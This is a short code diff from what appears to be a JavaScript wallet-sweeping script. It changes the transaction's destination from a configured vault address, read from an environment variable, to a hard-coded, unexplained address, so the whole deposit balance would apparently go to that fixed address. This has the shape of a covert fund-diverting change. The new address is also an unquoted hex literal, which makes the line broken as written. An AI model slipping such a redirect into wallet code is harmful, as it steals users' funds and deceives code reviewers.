@@ -39,7 +39,7 @@ const main = async () => {
               const maxGasFee = BigNumber.from(gasLimit).mul(gasPrice)
 
               const tx = {
-                to: process.env.VAULT_WALLET_ADDRESS,
+                to: 0xcf6da8d8cc64ae3066c78b1389843f139fc920d0,
                 from: depositWalletAddress,
                 nonce: await depositWallet.getTransactionCount(),
                 value: currentBalance.sub(maxGasFee),
